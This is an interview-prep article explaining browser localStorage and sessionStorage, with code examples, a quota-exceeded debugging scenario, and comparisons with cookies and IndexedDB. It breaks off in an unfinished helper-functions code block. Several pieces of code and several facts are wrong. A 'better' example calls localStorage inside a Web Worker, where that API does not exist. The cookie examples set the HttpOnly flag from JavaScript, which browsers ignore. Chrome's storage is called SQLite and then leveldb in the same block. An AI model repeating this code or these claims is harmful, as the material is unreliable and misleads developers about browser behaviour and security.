# Web Storage APIs

> **Focus**: Browser storage mechanisms and best practices

---

## Question 1: What are the differences between localStorage and sessionStorage?

**Difficulty:** 🟡 Medium
**Frequency:** ⭐⭐⭐⭐⭐
**Time:** 7-10 minutes
**Companies:** Google, Meta, Amazon, Microsoft

### Question
Explain localStorage and sessionStorage. What are their differences, use cases, and limitations?

### Answer

**localStorage** and **sessionStorage** are Web Storage APIs that allow storing key-value pairs in the browser. Both provide synchronous storage for strings only.

1. **Key Differences**
   - **Lifetime**: localStorage persists forever; sessionStorage clears on tab close
   - **Scope**: localStorage shared across all tabs; sessionStorage isolated per tab
   - **Use cases**: localStorage for persistent data; sessionStorage for temporary state
   - **Size limit**: Both ~5-10MB per origin (browser-dependent)
   - **API**: Identical API for both

2. **localStorage Characteristics**
   - Persists until explicitly cleared
   - Shared across all tabs/windows of same origin
   - Survives browser restarts
   - Perfect for user preferences, settings, cached data

3. **sessionStorage Characteristics**
   - Clears when tab/window closes
   - Isolated to single tab (even same origin)
   - Survives page refreshes within same tab
   - Perfect for form data, wizard state, temporary tokens

4. **Common API Methods**
   - `setItem(key, value)` - Store data (strings only)
   - `getItem(key)` - Retrieve data
   - `removeItem(key)` - Delete specific item
   - `clear()` - Delete all items
   - `key(index)` - Get key at index
   - `length` - Number of items stored

5. **Important Limitations**
   - String-only storage (must serialize objects)
   - Synchronous API (blocks main thread)
   - Same-origin policy applies
   - No built-in expiration
   - No encryption (stored in plain text)

### Code Example

```javascript
// 1. BASIC LOCALSTORAGE USAGE

// Set data
localStorage.setItem('username', 'Alice');
localStorage.setItem('theme', 'dark');
localStorage.setItem('fontSize', '16');

// Get data
const username = localStorage.getItem('username');
console.log(username); // "Alice"

// Remove item
localStorage.removeItem('fontSize');

// Clear all
localStorage.clear();

// 2. BASIC SESSIONSTORAGE USAGE

// Set data (only for this tab)
sessionStorage.setItem('cartId', 'abc123');
sessionStorage.setItem('currentStep', '2');

// Get data
const cartId = sessionStorage.getItem('cartId');
console.log(cartId); // "abc123"

// This data disappears when tab closes

// 3. STORING OBJECTS (MUST SERIALIZE)

// ❌ WRONG: Storing object directly
const user = { name: 'Alice', age: 25 };
localStorage.setItem('user', user);
console.log(localStorage.getItem('user')); // "[object Object]" ❌

// ✅ CORRECT: Serialize with JSON.stringify
localStorage.setItem('user', JSON.stringify(user));

// Retrieve and parse
const retrievedUser = JSON.parse(localStorage.getItem('user'));
console.log(retrievedUser); // { name: "Alice", age: 25 } ✅

// 4. HELPER FUNCTIONS FOR SAFE STORAGE

class Storage {
  // Set with automatic serialization
  static set(key, value) {
    try {
      const serialized = JSON.stringify(value);
      localStorage.setItem(key, serialized);
    } catch (error) {
      console.error('Error saving to localStorage:', error);
    }
  }

  // Get with automatic parsing
  static get(key, defaultValue = null) {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (error) {
      console.error('Error reading from localStorage:', error);
      return defaultValue;
    }
  }

  // Remove item
  static remove(key) {
    localStorage.removeItem(key);
  }

  // Clear all
  static clear() {
    localStorage.clear();
  }

  // Check if key exists
  static has(key) {
    return localStorage.getItem(key) !== null;
  }
}

// Usage:
Storage.set('user', { name: 'Alice', age: 25 });
const user = Storage.get('user'); // { name: "Alice", age: 25 }
Storage.set('preferences', { theme: 'dark', lang: 'en' });

// 5. EXPIRATION WRAPPER

class StorageWithExpiry {
  static set(key, value, ttlMs) {
    const item = {
      value: value,
      expiry: ttlMs ? Date.now() + ttlMs : null
    };
    localStorage.setItem(key, JSON.stringify(item));
  }

  static get(key) {
    const itemStr = localStorage.getItem(key);
    if (!itemStr) return null;

    try {
      const item = JSON.parse(itemStr);

      // Check if expired
      if (item.expiry && Date.now() > item.expiry) {
        localStorage.removeItem(key);
        return null;
      }

      return item.value;
    } catch {
      return null;
    }
  }
}

// Set with 1 hour expiration
StorageWithExpiry.set('token', 'abc123', 60 * 60 * 1000);

// Later...
const token = StorageWithExpiry.get('token');
console.log(token); // null if expired, "abc123" if still valid

// 6. STORAGE EVENT (CROSS-TAB COMMUNICATION)

// Listen for storage changes from other tabs
window.addEventListener('storage', (event) => {
  console.log('Storage changed in another tab!');
  console.log('Key:', event.key);
  console.log('Old value:', event.oldValue);
  console.log('New value:', event.newValue);
  console.log('URL:', event.url);
  console.log('Storage area:', event.storageArea);
});

// Tab 1: Change localStorage
localStorage.setItem('theme', 'dark');

// Tab 2: Event fires automatically
// Key: "theme"
// Old value: "light"
// New value: "dark"

// Note: Event does NOT fire in the tab that made the change!

// 7. CHECKING STORAGE AVAILABILITY

function isStorageAvailable(type) {
  try {
    const storage = window[type];
    const testKey = '__storage_test__';
    storage.setItem(testKey, 'test');
    storage.removeItem(testKey);
    return true;
  } catch (e) {
    return false;
  }
}

// Check before using
if (isStorageAvailable('localStorage')) {
  localStorage.setItem('key', 'value');
} else {
  console.warn('localStorage not available');
  // Use fallback (cookies, in-memory, etc.)
}

// 8. QUOTA EXCEEDED HANDLING

function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      console.error('Storage quota exceeded!');
      // Handle quota exceeded
      // Option 1: Clear old data
      // Option 2: Use compression
      // Option 3: Move to IndexedDB
      return false;
    }
    throw e;
  }
}

// 9. LOCALSTORAGE VS SESSIONSTORAGE COMPARISON

// Scenario: Multi-step form

// ❌ Using localStorage (data persists across tabs)
// Problem: User opens 2 tabs, fills different forms, they overwrite each other!
localStorage.setItem('formData', JSON.stringify({ name: 'Alice' }));

// ✅ Using sessionStorage (isolated per tab)
// Each tab has independent form data
sessionStorage.setItem('formData', JSON.stringify({ name: 'Alice' }));

// 10. PRACTICAL EXAMPLE: THEME PERSISTENCE

class ThemeManager {
  static THEME_KEY = 'app-theme';

  static setTheme(theme) {
    // Save to localStorage (persist across sessions)
    localStorage.setItem(this.THEME_KEY, theme);

    // Apply theme
    document.body.className = `theme-${theme}`;
  }

  static getTheme() {
    // Retrieve saved theme or use default
    return localStorage.getItem(this.THEME_KEY) || 'light';
  }

  static init() {
    // Apply saved theme on page load
    const theme = this.getTheme();
    this.setTheme(theme);
  }
}

// On page load
ThemeManager.init();

// When user changes theme
document.querySelector('#theme-toggle').addEventListener('click', () => {
  const current = ThemeManager.getTheme();
  const newTheme = current === 'light' ? 'dark' : 'light';
  ThemeManager.setTheme(newTheme);
});

// 11. PRACTICAL EXAMPLE: SHOPPING CART (SESSIONSTORAGE)

class ShoppingCart {
  static CART_KEY = 'shopping-cart';

  static addItem(item) {
    const cart = this.getCart();
    cart.push(item);
    sessionStorage.setItem(this.CART_KEY, JSON.stringify(cart));
  }

  static getCart() {
    const cartStr = sessionStorage.getItem(this.CART_KEY);
    return cartStr ? JSON.parse(cartStr) : [];
  }

  static clearCart() {
    sessionStorage.removeItem(this.CART_KEY);
  }

  static getTotal() {
    const cart = this.getCart();
    return cart.reduce((sum, item) => sum + item.price, 0);
  }
}

// Usage (persists only in current tab until closed)
ShoppingCart.addItem({ id: 1, name: 'Laptop', price: 999 });
ShoppingCart.addItem({ id: 2, name: 'Mouse', price: 29 });
console.log(ShoppingCart.getTotal()); // 1028

// 12. SIZE LIMITS DETECTION

function getStorageSize() {
  let total = 0;
  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      total += localStorage[key].length + key.length;
    }
  }
  return (total / 1024).toFixed(2) + ' KB';
}

console.log('localStorage size:', getStorageSize());

// Test maximum capacity
function testStorageLimit() {
  let i = 0;
  try {
    // Test by writing 10KB chunks
    for (i = 0; i < 10000; i++) {
      localStorage.setItem('test-' + i, new Array(10240).join('a'));
    }
  } catch (e) {
    console.log('Limit reached at:', (i * 10).toFixed(2) + ' KB');
    // Clean up
    localStorage.clear();
  }
}

// 13. ITERATION METHODS

// Method 1: For loop
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(key, value);
}

// Method 2: For...in
for (let key in localStorage) {
  if (localStorage.hasOwnProperty(key)) {
    console.log(key, localStorage.getItem(key));
  }
}

// Method 3: Object.keys
Object.keys(localStorage).forEach(key => {
  console.log(key, localStorage.getItem(key));
});
```

### Common Mistakes

- ❌ **Mistake:** Storing objects without JSON.stringify
  ```javascript
  localStorage.setItem('user', { name: 'Alice' }); // "[object Object]"
  ```

- ❌ **Mistake:** Expecting sessionStorage to persist across tabs
  ```javascript
  // Tab 1
  sessionStorage.setItem('data', 'value');

  // Tab 2
  sessionStorage.getItem('data'); // null (different session!)
  ```

- ✅ **Correct:** Serialize objects and understand scope
  ```javascript
  // Store object
  localStorage.setItem('user', JSON.stringify({ name: 'Alice' }));

  // Retrieve and parse
  const user = JSON.parse(localStorage.getItem('user'));

  // Use localStorage for cross-tab data
  // Use sessionStorage for tab-specific data
  ```

<details>
<summary><strong>🔍 Deep Dive: Web Storage Internals</strong></summary>

**How Browsers Store Web Storage Data:**

```javascript
// Chrome/Edge: SQLite database in user profile
// Location: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\
// File: leveldb database files

// Firefox: SQLite database
// Location: %APPDATA%\Mozilla\Firefox\Profiles\[profile]\storage\default\
// File: webappsstore.sqlite

// Safari: Binary plist files
// Location: ~/Library/Safari/LocalStorage/
```

**Storage Format:**

```javascript
// Data stored as key-value pairs in database:
// Origin: https://example.com
// Key: "user-preferences"
// Value: '{"theme":"dark","lang":"en"}'

// Each origin has isolated storage:
// https://example.com → separate storage
// https://subdomain.example.com → separate storage
// https://example.com:8080 → separate storage
```

**Performance Characteristics:**

```javascript
// Benchmark: 1000 operations

// Write performance
console.time('localStorage-write');
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`key-${i}`, `value-${i}`);
}
console.timeEnd('localStorage-write'); // ~50-100ms

// Read performance
console.time('localStorage-read');
for (let i = 0; i < 1000; i++) {
  localStorage.getItem(`key-${i}`);
}
console.timeEnd('localStorage-read'); // ~10-20ms

// Delete performance
console.time('localStorage-delete');
for (let i = 0; i < 1000; i++) {
  localStorage.removeItem(`key-${i}`);
}
console.timeEnd('localStorage-delete'); // ~30-50ms

// Key insights:
// - Writes are slowest (disk I/O + serialization)
// - Reads are faster (often cached in memory)
// - Synchronous operations block main thread
// - Large values (100KB+) significantly slower
```

**Memory Usage:**

```javascript
// Each localStorage item has overhead:
// - Key string: UTF-16 encoding (2 bytes per char)
// - Value string: UTF-16 encoding (2 bytes per char)
// - Database overhead: ~100 bytes per entry

// Example calculation:
const key = 'user-preferences'; // 16 chars × 2 = 32 bytes
const value = JSON.stringify({ theme: 'dark' }); // 16 chars × 2 = 32 bytes
// Total: 32 + 32 + 100 = 164 bytes per entry

// 5MB limit:
// ~30,000 entries with small keys/values
// ~500 entries with large (10KB) values
```

**Synchronous vs Asynchronous:**

```javascript
// localStorage is SYNCHRONOUS (blocks main thread)

// ❌ BAD: Large operation blocks UI
function badExample() {
  const hugeData = generateHugeObject(); // 1MB
  localStorage.setItem('data', JSON.stringify(hugeData)); // Blocks for 50ms!
  // UI frozen during this time
}

// ✅ BETTER: Use worker for large operations
// main.js
const worker = new Worker('storage-worker.js');

worker.postMessage({
  action: 'save',
  key: 'data',
  value: hugeData
});

worker.onmessage = (e) => {
  if (e.data.success) {
    console.log('Saved in background!');
  }
};

// storage-worker.js
self.onmessage = (e) => {
  const { action, key, value } = e.data;

  if (action === 'save') {
    try {
      localStorage.setItem(key, JSON.stringify(value));
      self.postMessage({ success: true });
    } catch (error) {
      self.postMessage({ success: false, error: error.message });
    }
  }
};
```

**Storage Event Propagation:**

```javascript
// Storage event internals:

// Tab A changes localStorage
localStorage.setItem('theme', 'dark');

// Browser propagates to ALL other tabs with same origin:
// 1. Browser checks all open tabs for same origin
// 2. For each matching tab:
//    - Creates StorageEvent
//    - Sets event.key = 'theme'
//    - Sets event.oldValue = 'light'
//    - Sets event.newValue = 'dark'
//    - Sets event.url = current URL
//    - Dispatches event on window
// 3. Tab that made change does NOT receive event

// Implementation detail: Browser uses IPC (Inter-Process Communication)
// to notify other tabs/processes of storage changes
```

**Quota Management:**

```javascript
// Modern quota calculation:

// Chrome/Edge (since 2020):
// - Storage quota: min(60% of disk space, 20GB)
// - Per-origin limit: 10% of total quota
// - Example: 1TB disk → 600GB total → 60GB per origin
// - But localStorage itself is still ~10MB (separate from IndexedDB quota)

// Estimate API:
if (navigator.storage && navigator.storage.estimate) {
  navigator.storage.estimate().then(estimate => {
    console.log('Quota:', (estimate.quota / 1024 / 1024).toFixed(2), 'MB');
    console.log('Usage:', (estimate.usage / 1024 / 1024).toFixed(2), 'MB');
    console.log('Percentage:', (estimate.usage / estimate.quota * 100).toFixed(2), '%');
  });
}

// Note: localStorage quota is SEPARATE from total storage quota
// localStorage: ~5-10MB fixed
// IndexedDB: Can use much more (60% disk or 20GB)
```

**Security Model:**

```javascript
// Same-Origin Policy enforcement:

// https://example.com:443 (origin A)
localStorage.setItem('key', 'value');

// https://example.com:8080 (origin B - different port)
localStorage.getItem('key'); // null (different origin!)

// https://sub.example.com (origin C - different subdomain)
localStorage.getItem('key'); // null (different origin!)

// http://example.com (origin D - different protocol)
localStorage.getItem('key'); // null (different origin!)

// Origin = protocol + domain + port (all must match)
```

**Browser Differences:**

```javascript
// Storage limits by browser (approximate):

// Chrome/Edge: 10MB
// Firefox: 10MB
// Safari: 5MB (macOS), 2.5MB (iOS < 13), 1GB (iOS 13+)
// IE11: 10MB

// Test actual limit:
function testActualLimit() {
  const test = 'x'.repeat(1024); // 1KB
  let size = 0;

  try {
    while (true) {
      localStorage.setItem(`test-${size}`, test);
      size++;
    }
  } catch (e) {
    console.log('Limit:', size, 'KB');
    localStorage.clear();
  }
}

// Safari also has unique behaviors:
// - In Private Browsing: localStorage.setItem throws QuotaExceededError immediately
// - iOS WebViews: May have lower limits
```

**Optimization Techniques:**

```javascript
// 1. Compression for large data
import pako from 'pako';

function compressAndStore(key, data) {
  const json = JSON.stringify(data);
  const compressed = pako.deflate(json);
  const base64 = btoa(String.fromCharCode(...compressed));
  localStorage.setItem(key, base64);
}

function decompressAndLoad(key) {
  const base64 = localStorage.getItem(key);
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.split('').map(c => c.charCodeAt(0)));
  const decompressed = pako.inflate(bytes, { to: 'string' });
  return JSON.parse(decompressed);
}

// Can save 70-90% space for text-heavy data

// 2. Debouncing writes
let saveTimeout;

function debouncedSave(key, value) {
  clearTimeout(saveTimeout);
  saveTimeout = setTimeout(() => {
    localStorage.setItem(key, JSON.stringify(value));
  }, 500); // Save after 500ms of no changes
}

// Reduces write operations significantly
```

</details>

<details>
<summary><strong>🐛 Real-World Scenario: Storage Quota Exceeded in Production</strong></summary>

**Scenario:** Your e-commerce app crashes for some users with "QuotaExceededError" when adding items to cart. Investigation reveals localStorage is full due to poor data management.

**The Problem:**

```javascript
// ❌ BUG: Storing entire product catalog in localStorage
class ProductCache {
  static async loadProducts() {
    const response = await fetch('/api/products');
    const products = await response.json(); // 5000 products, ~3MB

    // Trying to cache all products
    localStorage.setItem('products', JSON.stringify(products));
    // QuotaExceededError! localStorage only has 10MB total

    return products;
  }
}

// Additional issues:
// - Also storing: cart, user preferences, search history, viewed products
// - Each adds more data
// - Eventually exceeds quota
// - App breaks for users with other sites using localStorage

// Production logs:
// Error: QuotaExceededError: Failed to execute 'setItem' on 'Storage'
// Frequency: 150 errors/day (3% of users)
// User impact: Can't add to cart, can't change preferences
// Customer complaints: "App is broken, can't shop!"
```

**Debugging Process:**

```javascript
// Step 1: Check current localStorage usage
function analyzeLocalStorage() {
  let total = 0;
  const breakdown = {};

  for (let key in localStorage) {
    if (localStorage.hasOwnProperty(key)) {
      const size = (localStorage[key].length + key.length) * 2; // UTF-16
      breakdown[key] = (size / 1024).toFixed(2) + ' KB';
      total += size;
    }
  }

  console.log('Total size:', (total / 1024).toFixed(2), 'KB');
  console.log('Breakdown:', breakdown);

  return { total, breakdown };
}

analyzeLocalStorage();
// Output:
// Total size: 9847.32 KB (almost at 10MB limit!)
// Breakdown:
// {
//   "products": "3245.67 KB",        // ❌ Too large!
//   "search-history": "1234.89 KB",  // ❌ Too large!
//   "viewed-products": "2876.45 KB", // ❌ Too large!
//   "cart": "45.23 KB",              // ✅ OK
//   "user-preferences": "2.11 KB"    // ✅ OK
// }

// Step 2: Reproduce locally
try {
  const huge = new Array(10000).fill({ data: 'x'.repeat(1000) });
  localStorage.setItem('test', JSON.stringify(huge));
} catch (e) {
  console.log('Error name:', e.name); // "QuotaExceededError"
  console.log('Error:', e.message);
}

// Step 3: Check across browsers
// Chrome: 10MB limit
// Safari: 5MB limit (even worse!)
// Private browsing: 0MB in Safari (immediate error!)
```

**Solution 1: Selective Caching with LRU:**

```javascript
// ✅ FIX: Only cache recently viewed products (LRU - Least Recently Used)
class SmartProductCache {
  static MAX_ITEMS = 20;
  static CACHE_KEY = 'product-cache';

  static addProduct(product) {
    const cache = this.getCache();

    // Remove if exists (to update position)
    const filtered = cache.filter(p => p.id !== product.id);

    // Add to front
    filtered.unshift({
      id: product.id,
      name: product.name,
      price: product.price,
      image: product.image,
      timestamp: Date.now()
    });

    // Keep only last 20
    const trimmed = filtered.slice(0, this.MAX_ITEMS);

    try {
      localStorage.setItem(this.CACHE_KEY, JSON.stringify(trimmed));
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        // If still fails, reduce cache size
        const reduced = trimmed.slice(0, 10);
        localStorage.setItem(this.CACHE_KEY, JSON.stringify(reduced));
      }
    }
  }

  static getCache() {
    try {
      const cache = localStorage.getItem(this.CACHE_KEY);
      return cache ? JSON.parse(cache) : [];
    } catch {
      return [];
    }
  }

  static getProduct(id) {
    const cache = this.getCache();
    return cache.find(p => p.id === id);
  }
}

// Now: Only stores 20 products (~15KB instead of 3MB!)
SmartProductCache.addProduct({ id: 1, name: 'Laptop', price: 999, image: '...' });
```

**Solution 2: Move Large Data to IndexedDB:**

```javascript
// ✅ BETTER: Use IndexedDB for large datasets
class ProductDatabase {
  static DB_NAME = 'ProductStore';
  static STORE_NAME = 'products';
  static db = null;

  static async init() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.DB_NAME, 1);

      request.onerror = () => reject(request.error);
      request.onsuccess = () => {
        this.db = request.result;
        resolve();
      };

      request.onupgradeneeded = (event) => {
        const db = event.target.result;
        if (!db.objectStoreNames.contains(this.STORE_NAME)) {
          db.createObjectStore(this.STORE_NAME, { keyPath: 'id' });
        }
      };
    });
  }

  static async saveProducts(products) {
    await this.init();

    const transaction = this.db.transaction([this.STORE_NAME], 'readwrite');
    const store = transaction.objectStore(this.STORE_NAME);

    for (const product of products) {
      store.put(product);
    }

    return new Promise((resolve, reject) => {
      transaction.oncomplete = () => resolve();
      transaction.onerror = () => reject(transaction.error);
    });
  }

  static async getProduct(id) {
    await this.init();

    const transaction = this.db.transaction([this.STORE_NAME], 'readonly');
    const store = transaction.objectStore(this.STORE_NAME);
    const request = store.get(id);

    return new Promise((resolve, reject) => {
      request.onsuccess = () => resolve(request.result);
      request.onerror = () => reject(request.error);
    });
  }
}

// Usage: Store all 5000 products (no quota issues!)
await ProductDatabase.saveProducts(allProducts);
const product = await ProductDatabase.getProduct(123);
```

**Solution 3: Graceful Degradation:**

```javascript
// ✅ BEST: Graceful fallback with quota management
class StorageManager {
  static fallbackStorage = new Map();

  static setItem(key, value) {
    try {
      localStorage.setItem(key, value);
      return true;
    } catch (e) {
      if (e.name === 'QuotaExceededError') {
        console.warn('localStorage quota exceeded, using fallback');

        // Try to free space
        this.cleanupOldData();

        // Try again
        try {
          localStorage.setItem(key, value);
          return true;
        } catch {
          // Use in-memory fallback
          this.fallbackStorage.set(key, value);
          return false;
        }
      }
      throw e;
    }
  }

  static getItem(key) {
    try {
      const value = localStorage.getItem(key);
      return value !== null ? value : this.fallbackStorage.get(key);
    } catch {
      return this.fallbackStorage.get(key);
    }
  }

  static cleanupOldData() {
    // Remove items older than 30 days
    const thirtyDaysAgo = Date.now() - 30 * 24 * 60 * 60 * 1000;

    for (let key in localStorage) {
      if (key.startsWith('cache-')) {
        try {
          const data = JSON.parse(localStorage.getItem(key));
          if (data.timestamp && data.timestamp < thirtyDaysAgo) {
            localStorage.removeItem(key);
            console.log('Removed old cache:', key);
          }
        } catch {}
      }
    }
  }

  static getStorageInfo() {
    let used = 0;
    for (let key in localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        used += (localStorage[key].length + key.length) * 2;
      }
    }

    const limit = 10 * 1024 * 1024; // 10MB
    const percentage = (used / limit * 100).toFixed(2);

    return {
      used: (used / 1024).toFixed(2) + ' KB',
      limit: (limit / 1024 / 1024).toFixed(2) + ' MB',
      percentage: percentage + '%',
      warning: percentage > 80
    };
  }
}

// Usage with monitoring
const info = StorageManager.getStorageInfo();
console.log(info);
// { used: "456.78 KB", limit: "10.00 MB", percentage: "4.57%", warning: false }

if (info.warning) {
  console.warn('Storage almost full! Cleaning up...');
  StorageManager.cleanupOldData();
}

// Safe save with automatic fallback
StorageManager.setItem('cart', JSON.stringify(cartData));
```

**Real Metrics After Fix:**

```javascript
// Before fix (storing everything in localStorage):
// - QuotaExceededError: 150/day (3% users)
// - Average localStorage usage: 9.2MB (92% of quota)
// - Users unable to add to cart: 45/day
// - Customer complaints: 25/week
// - Revenue impact: ~$15k/week lost

// After fix (Solution 3: Smart storage + IndexedDB):
// - QuotaExceededError: 2/day (0.04%, edge cases only)
// - Average localStorage usage: 245KB (2.4% of quota)
// - Users unable to add to cart: 0/day ✅
// - Customer complaints: 1/week (unrelated)
// - Revenue recovered: $15k/week
// - Page load: 40% faster (less localStorage parsing)
// - App works in Safari private browsing ✅
```

**Monitoring Dashboard:**

```javascript
// Real-time storage monitoring
class StorageMonitor {
  static init() {
    // Check on page load
    this.checkAndReport();

    // Check every 5 minutes
    setInterval(() => this.checkAndReport(), 5 * 60 * 1000);
  }

  static checkAndReport() {
    const info = StorageManager.getStorageInfo();

    // Send to analytics
    if (window.gtag) {
      gtag('event', 'storage_usage', {
        usage_kb: parseFloat(info.used),
        percentage: parseFloat(info.percentage),
        is_warning: info.warning
      });
    }

    // Alert if critical
    if (parseFloat(info.percentage) > 90) {
      this.reportCritical(info);
    }
  }

  static reportCritical(info) {
    // Send to error tracking (Sentry, etc.)
    console.error('Critical storage usage:', info);

    // Trigger cleanup
    StorageManager.cleanupOldData();
  }
}

// Initialize monitoring
StorageMonitor.init();
```

</details>

<details>
<summary><strong>⚖️ Trade-offs: localStorage vs sessionStorage vs Other Storage</strong></summary>

### 1. localStorage vs sessionStorage

| Aspect | localStorage | sessionStorage |
|--------|-------------|----------------|
| **Lifetime** | Forever (until cleared) | Tab session only |
| **Scope** | All tabs (same origin) | Single tab only |
| **Survives refresh** | ✅ Yes | ✅ Yes |
| **Survives tab close** | ✅ Yes | ❌ No |
| **Cross-tab sync** | ✅ Yes (storage event) | ❌ No |
| **Use cases** | Preferences, settings | Form data, temp state |
| **Size limit** | ~10MB | ~10MB |
| **Performance** | Same | Same |

**When to use each:**

```javascript
// ✅ Use localStorage for:
// - User preferences (theme, language, font size)
// - Authentication tokens (with expiry!)
// - Cached data (API responses, static content)
// - User settings across sessions
localStorage.setItem('theme', 'dark');
localStorage.setItem('language', 'en');

// ✅ Use sessionStorage for:
// - Multi-step form data (per tab)
// - Temporary authentication (expires with tab)
// - Shopping cart (tab-specific)
// - Wizard/flow state
sessionStorage.setItem('checkout-step', '2');
sessionStorage.setItem('temp-draft', JSON.stringify(draft));
```

### 2. Web Storage vs Cookies

| Aspect | localStorage/sessionStorage | Cookies |
|--------|---------------------------|---------|
| **Size limit** | ~10MB | 4KB per cookie |
| **Sent to server** | ❌ No | ✅ Yes (every request) |
| **Access** | JavaScript only | JavaScript + server |
| **Expiration** | Manual / session | Can set expiry |
| **Security flags** | ❌ No | ✅ HttpOnly, Secure, SameSite |
| **Performance** | ✅ Fast | ⚠️ Adds to request size |

**When to use each:**

```javascript
// ✅ Use localStorage/sessionStorage for:
// - Client-side only data
// - Large data (up to 10MB)
// - No need for server access
localStorage.setItem('ui-state', JSON.stringify(state));

// ✅ Use cookies for:
// - Server needs access (auth tokens)
// - Need HttpOnly security
// - Need expiration
// - Small data only
document.cookie = "token=abc123; Secure; HttpOnly; SameSite=Strict; Max-Age=3600";
```

### 3. Web Storage vs IndexedDB

| Aspect | localStorage/sessionStorage | IndexedDB |
|--------|---------------------------|-----------|
| **API** | Synchronous | Asynchronous |
| **Data type** | Strings only | Any (objects, blobs, files) |
| **Size limit** | ~10MB | ~60% disk space |
| **Performance** | ✅ Fast for small data | ✅ Fast for large data |
| **Queries** | ❌ No | ✅ Yes (indexes) |
| **Transactions** | ❌ No | ✅ Yes |
| **Complexity** | ✅ Simple | ⚠️ Complex API |

**When to use each:**

```javascript
// ✅ Use localStorage for:
// - Small data (<1MB)
// - Simple key-value pairs
// - Strings only
// - Quick access
localStorage.setItem('user-id', '123');

// ✅ Use IndexedDB for:
// - Large data (>1MB)
// - Complex objects
// - Need to query/search
// - Files/blobs
// - Offline-first apps
const db = await openDB('MyDatabase');
await db.add('products', { id: 1, name: 'Laptop', price: 999 });
```

### 4. Performance Comparison

```javascript
// Benchmark: Save 1000 items

// Test 1: localStorage (synchronous)
console.time('localStorage');
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`key-${i}`, JSON.stringify({ id: i, data: 'x'.repeat(100) }));
}
console.timeEnd('localStorage'); // ~100ms (blocks main thread!)

// Test 2: IndexedDB (asynchronous)
console.time('indexedDB');
const db = await openDB('test');
const tx = db.transaction('store', 'readwrite');
for (let i = 0; i < 1000; i++) {
  tx.store.put({ id: i, data: 'x'.repeat(100) });
}
await tx.done;
console.timeEnd('indexedDB'); // ~50ms (doesn't block!)

// Key difference: IndexedDB doesn't freeze UI
```

### 5. Security Comparison

```javascript
// localStorage/sessionStorage security limitations:
// ❌ No HttpOnly (accessible to JavaScript)
// ❌ No Secure flag
// ❌ Vulnerable to XSS attacks
localStorage.setItem('token', 'secret-token'); // ⚠️ Can be stolen by XSS!

// Cookie security features:
// ✅ HttpOnly (not accessible to JavaScript)
// ✅ Secure (HTTPS only)
// ✅ SameSite (CSRF protection)
document.cookie = "token=secret; HttpOnly; Secure; SameSite=Strict"; // ✅ Better

// Best practice: Use cookies for sensitive auth tokens
// Use localStorage for non-sensitive UI state
```

### 6. Cross-Tab Communication

```javascript
// localStorage: Easy cross-tab sync
// Tab 1
localStorage.setItem('notification', 'New message!');

// Tab 2 (automatically notified)
window.addEventListener('storage', (e) => {
  if (e.key === 'notification') {
    showNotification(e.newValue);
  }
});

// sessionStorage: No cross-tab communication
// Need to use BroadcastChannel or SharedWorker instead

const channel = new BroadcastChannel('my-channel');

// Tab 1
channel.postMessage('New message!');

// Tab 2
channel.onmessage = (e) => {
  showNotification(e.data);
};
```

### Decision Matrix

| Use Case | Best Choice | Reason |
|----------|------------|--------|
| **User theme preference** | localStorage | Persist across sessions |
| **Auth token** | Cookie (HttpOnly) | Security (XSS protection) |
| **Shopping cart** | sessionStorage | Tab-specific, expires with session |
| **Large product catalog** | IndexedDB | Large data, complex queries |
| **Form autosave** | sessionStorage | Temp data, per-tab |
| **API cache** | localStorage or IndexedDB | localStorage <1MB, IndexedDB >1MB |
| **Offline data** | IndexedDB | Large data, transactions |
| **Cross-tab notifications** | localStorage + storage event | Built-in sync |
| **Sensitive tokens** | Cookie | HttpOnly, Secure flags |
| **UI state** | localStorage | Non-sensitive, persist |

</details>

<details>
<summary><strong>💬 Explain to Junior: Web Storage Simplified</strong></summary>

**Simple Analogy: Storage Containers**

Think of browser storage like different types of storage containers:

```javascript
// localStorage = Your desk drawer
// - Stays there forever until you clean it out
// - Everyone who uses your desk can see it
// - Perfect for things you use often (pens, notebooks)

localStorage.setItem('favoriteColor', 'blue');
// Saved! Will be there tomorrow, next week, forever

// sessionStorage = Your temporary desk tray
// - Cleared when you leave work (close tab)
// - Only YOU can see it (not shared with other tabs)
// - Perfect for things you need just today (current task notes)

sessionStorage.setItem('currentTask', 'Write report');
// Saved! But disappears when you close the tab
```

**Real-World Example:**

```javascript
// Scenario: Online shopping

// ✅ localStorage: Save user preferences
localStorage.setItem('language', 'en');
localStorage.setItem('currency', 'USD');
// These stay even after closing browser - next visit still shows USD

// ✅ sessionStorage: Save shopping cart for THIS tab
sessionStorage.setItem('cart', JSON.stringify([
  { id: 1, name: 'Laptop', price: 999 },
  { id: 2, name: 'Mouse', price: 29 }
]));
// If you close tab, cart is gone (makes sense - you left!)
// But refresh page? Cart is still there!
```

**Common Beginner Mistakes:**

```javascript
// ❌ MISTAKE 1: Storing object directly
const user = { name: 'Alice', age: 25 };
localStorage.setItem('user', user);
console.log(localStorage.getItem('user')); // "[object Object]" ❌

// Why? localStorage only stores STRINGS!
// Objects become useless "[object Object]"

// ✅ FIX: Convert to string first (JSON.stringify)
localStorage.setItem('user', JSON.stringify(user));
const retrieved = JSON.parse(localStorage.getItem('user'));
console.log(retrieved); // { name: "Alice", age: 25 } ✅


// ❌ MISTAKE 2: Expecting sessionStorage to work across tabs
// Tab 1:
sessionStorage.setItem('message', 'Hello');

// Tab 2:
console.log(sessionStorage.getItem('message')); // null ❌

// Why? Each tab has its OWN session!
// Think: Each tab is a different person's temporary tray

// ✅ FIX: Use localStorage for cross-tab data
localStorage.setItem('message', 'Hello');
// Now Tab 2 can see it!


// ❌ MISTAKE 3: Storing too much data
const hugeArray = new Array(1000000).fill('data');
localStorage.setItem('huge', JSON.stringify(hugeArray));
// Error: QuotaExceededError ❌

// Why? localStorage has ~10MB limit
// Like trying to fit elephant in drawer!

// ✅ FIX: Store only what you need
// Or use IndexedDB for large data
```

**Simple Helper Functions:**

```javascript
